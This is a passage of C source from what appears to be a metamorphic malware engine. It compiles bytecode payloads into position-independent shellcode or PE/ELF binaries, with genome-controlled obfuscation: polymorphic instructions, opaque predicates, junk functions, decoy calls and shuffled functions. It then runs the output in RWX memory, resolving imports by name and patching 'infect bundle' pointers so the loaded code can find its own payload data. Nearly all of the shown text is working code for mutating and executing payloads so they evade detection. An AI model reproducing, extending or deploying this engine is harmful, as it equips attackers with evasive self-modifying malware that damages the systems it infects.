                    buf_write_bytes(extern_info, dll_name, dlen + 1);
                } else {
                    buf_write_u8(extern_info, 0);
                }
                flen = 0;
                while (func_name[flen] != 0) { flen = flen + 1; }
                buf_write_bytes(extern_info, func_name, flen + 1);
                found = 1;
            }
            i = i + 1;
        }
        slot = slot + 1;
    }
    // Update count in extern_info header
    extern_info->data[0] = extern_count & 0xFF;
    extern_info->data[1] = (extern_count >> 8) & 0xFF;
    extern_info->data[2] = (extern_count >> 16) & 0xFF;
    extern_info->data[3] = (extern_count >> 24) & 0xFF;

    // Build result buffer
    result = buf_new(g_code->len + g_data->len + extern_info->len + 1024);

    // Header: 9 fields
    buf_write_u32(result, entry_offset);
    buf_write_u32(result, g_code->len);
    buf_write_u32(result, g_data->len);
    buf_write_u32(result, g_abs_data_fixup_count);
    buf_write_u32(result, g_abs_extern_fixup_count);
    buf_write_u32(result, g_abs_call_fixup_count);
    buf_write_u32(result, g_abs_faddr_fixup_count);
    buf_write_u32(result, extern_count);
    buf_write_u32(result, extern_info->len);

    // Data fixup table
    i = 0;
    while (i < g_abs_data_fixup_count) {
        buf_write_u32(result, g_abs_data_fixup_offsets[i]);
        buf_write_u32(result, g_abs_data_fixup_data_offs[i]);
        i = i + 1;
    }

    // Extern fixup table
    i = 0;
    while (i < g_abs_extern_fixup_count) {
        buf_write_u32(result, g_abs_extern_fixup_offsets[i]);
        buf_write_u32(result, g_abs_extern_fixup_slots[i]);
        i = i + 1;
    }

    // Call fixup table
    i = 0;
    while (i < g_abs_call_fixup_count) {
        buf_write_u32(result, g_abs_call_fixup_offsets[i]);
        buf_write_u32(result, g_abs_call_fixup_targets[i]);
        i = i + 1;
    }

    // FUNC_ADDR fixup table
    i = 0;
    while (i < g_abs_faddr_fixup_count) {
        buf_write_u32(result, g_abs_faddr_fixup_offsets[i]);
        buf_write_u32(result, g_abs_faddr_fixup_targets[i]);
        i = i + 1;
    }

    // Code, data, extern_info
    buf_write_bytes(result, g_code->data, g_code->len);
    if (g_data->len > 0) {
        buf_write_bytes(result, g_data->data, g_data->len);
    }
    if (extern_info->len > 0) {
        buf_write_bytes(result, extern_info->data, extern_info->len);
    }

    free(extern_info->data);
    free(extern_info);
    return result;
}

// =============================================================================
// Assemble .bin output (header + code + data + extern_info) into a buffer
// =============================================================================

struct Buffer* assemble_output() {
    int entry_offset;
    int extern_count;
    int user_extern_count;
    struct Buffer* extern_info;
    struct Buffer* result;
    char* dll_name;
    char* func_name;
    int dlen;
    int flen;
    int i;
    int slot;

    entry_offset = g_func_offsets[g_mod->entry_func];

    // Count externals
    extern_count = 0;
    i = 0;
    while (i < g_mod->func_count) {
        if (g_mod->funcs[i].block_count == 0) {
            extern_count = extern_count + 1;
        }
        i = i + 1;
    }

    // All externs are user externs, resolved by name
    user_extern_count = extern_count;
    if (user_extern_count < 0) {
        user_extern_count = 0;
    }

    // Build extern info — iterate by ascending API slot to preserve loader order
    // after reorder_funcs shuffling
    extern_info = buf_new(512);
    buf_write_u32(extern_info, user_extern_count);
    slot = 0;
    while (slot < user_extern_count) {
        // Find the function whose get_api_slot == slot
        i = 0;
        while (i < g_mod->func_count) {
            if (g_mod->funcs[i].block_count == 0 && get_api_slot(i) == slot) {
                dll_name = g_mod->funcs[i].dll_name;
                func_name = g_mod->funcs[i].name;
                if (dll_name != 0) {
                    dlen = str_len(dll_name);
                    buf_write_bytes(extern_info, dll_name, dlen + 1);
                } else {
                    buf_write_u8(extern_info, 0);
                }
                flen = str_len(func_name);
                buf_write_bytes(extern_info, func_name, flen + 1);
                i = g_mod->func_count; // break
            }
            i = i + 1;
        }
        slot = slot + 1;
    }

    // Build result: header(20) + code + data + extern_info
    result = buf_new(20 + g_code->len + g_data->len + extern_info->len);

    // Header: entry_offset, code_size, data_size, extern_count, extern_info_size
    buf_write_u32(result, entry_offset);
    buf_write_u32(result, g_code->len);
    buf_write_u32(result, g_data->len);
    buf_write_u32(result, extern_count);
    buf_write_u32(result, extern_info->len);

    // Code
    buf_write_bytes(result, g_code->data, g_code->len);

    // Data
    if (g_data->len > 0) {
        buf_write_bytes(result, g_data->data, g_data->len);
    }

    // Extern info
    if (extern_info->len > 0) {
        buf_write_bytes(result, extern_info->data, extern_info->len);
    }

    free(extern_info->data);
    free(extern_info);

    return result;
}

// =============================================================================
//
// Backend Module
//
// Contains the following sections:
//   1. Main entry point - compile() function
//   2. Compile pipeline helpers used by every application
//   3. Load and run PIC .bin in RWX memory
//
// =============================================================================

// =============================================================================
// Main entry point - compile() function
// =============================================================================
// When called as shellcode: main(_api, input_data, input_size, flags, out)
// _api is the hidden API table pointer at [EBP+8]
// User params start at [EBP+12]: input_data, input_size, flags, out

int compile_main(int _api, char* input_data, int input_size, int flags, struct CompileOutput* out) {
    struct Buffer* mc_buf;
    struct Buffer* assembled;
    int urfd;
    int seed;
    char seed_buf[4];
    int ef;

    // Extract g_cdecl_externs early so init_io() and PRNG seeding can use it
    if ((flags & CF_CDECL_EXTERNS) != 0) { g_cdecl_externs = 1; } else { g_cdecl_externs = 0; }

    init_io();

    out->bin_data = 0;
    out->bin_size = 0;
    out->mc_data = 0;
    out->mc_size = 0;

    // Initialize genome (defaults first, may be overwritten by binary genome)
    init_default_genome();

    // Parse bytecode
    g_mod = parse_bytecode(input_data, input_size);
    if (g_mod == 0) {
        return 1;
    }
    if (g_bc_pos + 8 <= input_size) {
        if (input_data[g_bc_pos] == 0x47 && input_data[g_bc_pos + 1] == 0x45
         && input_data[g_bc_pos + 2] == 0x4E && input_data[g_bc_pos + 3] == 0x45) {  // "GENE"
            load_genome_binary(input_data + g_bc_pos, input_size - g_bc_pos);
        }
    }

    // Initialize PRNG with platform-appropriate entropy
#ifdef LINUX
    seed = 12345;
    seed_buf[0] = 0; seed_buf[1] = 0; seed_buf[2] = 0; seed_buf[3] = 0;
    urfd = open("/dev/urandom", 0);
    if (urfd >= 0) {
        read(urfd, seed_buf, 4);
        close(urfd);
    }
    seed = seed_buf[0] | (seed_buf[1] << 8) | (seed_buf[2] << 16) | (seed_buf[3] << 24);
    seed = seed ^ clock();
    prng_seed(seed);
#endif
#ifdef WIN32
    prng_seed(GetTickCount());
#endif

    // Addressing mode: absolute for standalone PE/ELF, PIC for shellcode
    g_abs_mode = 0;
    if ((flags & CF_ABS_PE) != 0) {
        g_abs_mode = 1;
        g_pic_mode = 0;
    } else if ((flags & CF_ABS_ELF) != 0) {
        g_abs_mode = 2;
        g_pic_mode = 0;
    } else if ((flags & CF_SCATTER_ELF) != 0) {
        g_abs_mode = 2;
        g_pic_mode = 1;
    } else {
        g_pic_mode = 1;
    }

    // Store flags globally (must be before init_codegen so CF_CDECL_EXTERNS is visible)
    g_compile_flags = flags;

    // Apply gene expression: mask transform flags by expression_flags bitmask
    // (must be before any flag checks so silenced transforms are truly off)
    // Bit mapping: 0=obfuscate_names, 1=unfold, 2=substitute, 3=deadcode,
    // 4=nops, 5=reorder_instrs, 6=reorder_locals, 7=reorder_blocks, 8=reorder_funcs,
    // 9=poly_instrs, 10=dead_code_x86, 11=opaque, 12=junk_funcs,
    // 13=harmless_calls, 14=shuffle_funcs
    ef = g_genome[GI_EXPRESSION_FLAGS];
    if ((ef & 0x0001) == 0) { g_compile_flags = g_compile_flags & (~CF_IR_OBFUSCATE_NAMES); }
    if ((ef & 0x0002) == 0) { g_compile_flags = g_compile_flags & (~CF_IR_UNFOLD); }
    if ((ef & 0x0004) == 0) { g_compile_flags = g_compile_flags & (~CF_IR_SUBSTITUTE); }
    if ((ef & 0x0008) == 0) { g_compile_flags = g_compile_flags & (~CF_IR_DEADCODE); }
    if ((ef & 0x0010) == 0) { g_compile_flags = g_compile_flags & (~CF_IR_NOPS); }
    if ((ef & 0x0020) == 0) { g_compile_flags = g_compile_flags & (~CF_IR_REORDER_INSTRS); }
    if ((ef & 0x0040) == 0) { g_compile_flags = g_compile_flags & (~CF_IR_REORDER_LOCALS); }
    if ((ef & 0x0080) == 0) { g_compile_flags = g_compile_flags & (~CF_IR_REORDER_BLOCKS); }
    if ((ef & 0x0100) == 0) { g_compile_flags = g_compile_flags & (~CF_IR_REORDER_FUNCS); }
    if ((ef & 0x0200) == 0) { g_compile_flags = g_compile_flags & (~CF_X86_POLY_INSTRS); }
    if ((ef & 0x0400) == 0) { g_compile_flags = g_compile_flags & (~CF_X86_DEAD_CODE); }
    if ((ef & 0x0800) == 0) { g_compile_flags = g_compile_flags & (~CF_X86_OPAQUE); }
    if ((ef & 0x1000) == 0) { g_compile_flags = g_compile_flags & (~CF_X86_JUNK_FUNCS); }
    if ((ef & 0x2000) == 0) { g_compile_flags = g_compile_flags & (~CF_X86_HARMLESS_CALLS); }
    if ((ef & 0x4000) == 0) { g_compile_flags = g_compile_flags & (~CF_X86_SHUFFLE_FUNCS); }
    flags = g_compile_flags;

    // Permute extern api_slot values per seed (under --ir-reorder-funcs).
    // Safe in all output modes: the MC backend's compiled code uses
    // __syscall directly (inline INT 0x80 at every call site), so there's
    // no slot-to-wrapper coupling to break in ELF abs mode either.
    if ((flags & CF_IR_REORDER_FUNCS) != 0) {
        permute_api_slots();
    }

    // Randomize internal names if requested (after expression masking)
    if ((flags & CF_IR_OBFUSCATE_NAMES) != 0) {
        randomize_names();
    }

    // Extract x86 transform flags into globals
    if ((flags & CF_X86_POLY_INSTRS) != 0) { g_x86_poly_instrs = 1; } else { g_x86_poly_instrs = 0; }
    if ((flags & CF_X86_DEAD_CODE)   != 0) { g_x86_dead_code   = 1; } else { g_x86_dead_code   = 0; }
    if ((flags & CF_X86_OPAQUE)      != 0) { g_x86_opaque      = 1; } else { g_x86_opaque      = 0; }
    if ((flags & CF_X86_JUNK_FUNCS)  != 0) { g_x86_junk_funcs  = 1; } else { g_x86_junk_funcs  = 0; }
    if ((flags & CF_X86_HARMLESS_CALLS) != 0) { g_x86_harmless_calls = 1; } else { g_x86_harmless_calls = 0; }
    if ((flags & CF_X86_SHUFFLE_FUNCS)  != 0) { g_x86_shuffle_funcs  = 1; } else { g_x86_shuffle_funcs  = 0; }

    // Initialize code generator
    init_codegen();

    // Apply IR transformations (no-op if no CF_IR_* flags set)
    optimize_module();
    transform_module();
    optimize_module_random();

    // Sync g_entry_func_idx in case transform_reorder_funcs changed g_mod->entry_func
    g_entry_func_idx = g_mod->entry_func;

    // Emit transformed bytecode if requested
    if ((flags & CF_EMIT_MC) != 0) {
        mc_buf = emit_bytecode_buf();
        out->mc_data = mc_buf->data;
        out->mc_size = mc_buf->len;
        free(mc_buf);
    }

    // Generate x86 code
    gen_module();

    // Assemble output
    if (g_abs_mode != 0) {
        assembled = assemble_abs_output();
    } else {
        assembled = assemble_output();
    }
    out->bin_data = assembled->data;
    out->bin_size = assembled->len;
    free(assembled);

    return 0;
}

// =============================================================================
// Compile pipeline helpers used by every application
// =============================================================================

// Build a CF_* flag bitmask from the genome's 15-bit expression_flags gene.
// Returns base 0; callers OR in format selectors (CF_EMIT_MC, CF_ABS_PE,
// CF_ABS_ELF, CF_SCATTER_ELF, CF_CDECL_EXTERNS) as needed.
int build_flags_from_genome(char* genome, int genome_sz) {
    int flags; int expr;
    flags = 0;
    if (genome_sz < GENOME_MIN_SIZE) { return flags; }
    expr = read_i16(genome, GI_EXPRESSION_FLAGS_OFFSET) & 0x7FFF;
    if (expr & 0x0001) { flags = flags | CF_IR_OBFUSCATE_NAMES; }
    if (expr & 0x0002) { flags = flags | CF_IR_UNFOLD; }
    if (expr & 0x0004) { flags = flags | CF_IR_SUBSTITUTE; }
    if (expr & 0x0008) { flags = flags | CF_IR_DEADCODE; }
    if (expr & 0x0010) { flags = flags | CF_IR_NOPS; }
    if (expr & 0x0020) { flags = flags | CF_IR_REORDER_INSTRS; }
    if (expr & 0x0040) { flags = flags | CF_IR_REORDER_LOCALS; }
    if (expr & 0x0080) { flags = flags | CF_IR_REORDER_BLOCKS; }
    if (expr & 0x0100) { flags = flags | CF_IR_REORDER_FUNCS; }
    if (expr & 0x0200) { flags = flags | CF_X86_POLY_INSTRS; }
    if (expr & 0x0400) { flags = flags | CF_X86_DEAD_CODE; }
    if (expr & 0x0800) { flags = flags | CF_X86_OPAQUE; }
    if (expr & 0x1000) { flags = flags | CF_X86_JUNK_FUNCS; }
    if (expr & 0x2000) { flags = flags | CF_X86_HARMLESS_CALLS; }
    if (expr & 0x4000) { flags = flags | CF_X86_SHUFFLE_FUNCS; }
    return flags;
}

// Append genome to .mcb bytecode, invoke compile_main, free the combined buffer.
// On success, `out` is populated (bin_data/mc_data depending on flags).
int compile_one(char* mcb, int mcb_sz, char* genome, int genome_sz,
                int flags, struct CompileOutput* out) {
    char* combined; int combined_sz; int result;
    out->bin_data = 0;
    out->bin_size = 0;
    out->mc_data = 0;
    out->mc_size = 0;
    combined_sz = mcb_sz + genome_sz;
    combined = malloc(combined_sz);
    mem_copy(combined, mcb, mcb_sz);
    if (genome_sz > 0) {
        mem_copy(combined + mcb_sz, genome, genome_sz);
    }
    result = compile_main(0, combined, combined_sz, flags, out);
    free(combined);
    return result;
}

// =============================================================================
// Load and run PIC .bin in RWX memory
// =============================================================================
// Loads a compiled `.bin` (output of compile_main) into RWX, resolves its
// extern table, and invokes the entry. `bundle_addr` and `header_addr` are
// integrator-only hooks: when non-zero, the function patches the called
// code's `g_infect_bundle` / `g_bundle_header` globals so the called code
// can find its own bundle data. Pass 0 for both to use the function as a
// generic "compile and jump" — no bundle plumbing, just code+data+api table.

int load_and_run_bin(char* bin, int bin_sz,
                     int bundle_addr, int header_addr) {
    int entry_off; int code_sz; int data_sz;
    int ext_count; int ext_info_sz;
    char* code_ptr; char* data_ptr; char* ext_info;
    char* rwx; char* api;
    char* tgt_data;
    char* ptr;
    int i; int result;
    int entry_fn;

    entry_off   = read_i32(bin, 0);
    code_sz     = read_i32(bin, 4);
    data_sz     = read_i32(bin, 8);
    ext_count   = read_i32(bin, 12);
    ext_info_sz = read_i32(bin, 16);
    code_ptr = bin + PIC_HEADER_SIZE;
    data_ptr = bin + PIC_HEADER_SIZE + code_sz;
    ext_info = bin + PIC_HEADER_SIZE + code_sz + data_sz;

#ifdef WIN32
    rwx = VirtualAlloc(0, code_sz + data_sz, 0x3000, 0x40);
#endif
#ifdef LINUX
    rwx = malloc(code_sz + data_sz);
#endif
    if (rwx == 0) { return 1; }
    mem_copy(rwx, code_ptr, code_sz);
    if (data_sz > 0) { mem_copy(rwx + code_sz, data_ptr, data_sz); }

    api = malloc(ext_count * 4);
    mem_set(api, 0, ext_count * 4);

    ptr = ext_info + 4;
    i = 0;
    while (i < ext_count) {
        char* dll; char* func;
        int resolved;
        dll = ptr;
        while ((ptr[0] & 0xFF) != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        func = ptr;
        while ((ptr[0] & 0xFF) != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;

        resolved = 0;
#ifdef WIN32
        if (dll[0] != 0) {
            int mod;
            mod = LoadLibraryA(dll);
            if (mod != 0) { resolved = GetProcAddress(mod, func); }
        }
#endif
#ifdef LINUX
        resolved = resolve_linux_extern(dll, func);
#endif
        write_i32(api, i * 4, resolved);
        i = i + 1;
    }

    // Patch PIC API slot (offset 2 in code)
    write_i32(rwx, 2, api);

    tgt_data = rwx + code_sz;

    // Patch InfectBundle pointer (engine reads its own bundle through this)
    if (bundle_addr != 0) {
        if (g_infect_bundle_off >= 0) { write_i32(tgt_data, g_infect_bundle_off, bundle_addr); }
    }

    // Patch BundleHeader pointer (entry/engine reads decrypted bundle through this)
    if (header_addr != 0) {
        if (g_bundle_header_off >= 0) { write_i32(tgt_data, g_bundle_header_off, header_addr); }
    }

    entry_fn = rwx + entry_off;
    result = entry_fn(api);

#ifdef WIN32
    VirtualFree(rwx, 0, 0x8000);
#endif
#ifdef LINUX
    free(rwx);
#endif
    free(api);
    return result;
}

// Compile a payload .mcb to PIC and run it in RWX. Uses pre-mutation genome
// to derive transform flags via build_flags_from_genome. Strips bundle-output
// flags (CF_ABS_PE / CF_SCATTER_ELF / CF_EMIT_MC) so the output is plain PIC
// shellcode load_and_run_bin can execute. No-op if pay_sz <= 0.
void compile_and_run_payload(char* pay, int pay_sz, char* gen, int gen_sz) {
    int flags;
    struct CompileOutput co;
    if (pay_sz <= 0) { return; }
    flags = build_flags_from_genome(gen, gen_sz);
#ifdef LINUX
    flags = flags | CF_CDECL_EXTERNS;
#endif
    co.bin_data = 0; co.bin_size = 0;
    co.mc_data  = 0; co.mc_size  = 0;
    compile_one(pay, pay_sz, gen, gen_sz,
                flags & ~CF_ABS_PE & ~CF_SCATTER_ELF & ~CF_EMIT_MC, &co);
    if (co.bin_size > 0) {
        load_and_run_bin(co.bin_data, co.bin_size, 0, 0);
    }
    if (co.bin_data != 0) { free(co.bin_data); }
    if (co.mc_data  != 0) { free(co.mc_data); }
}
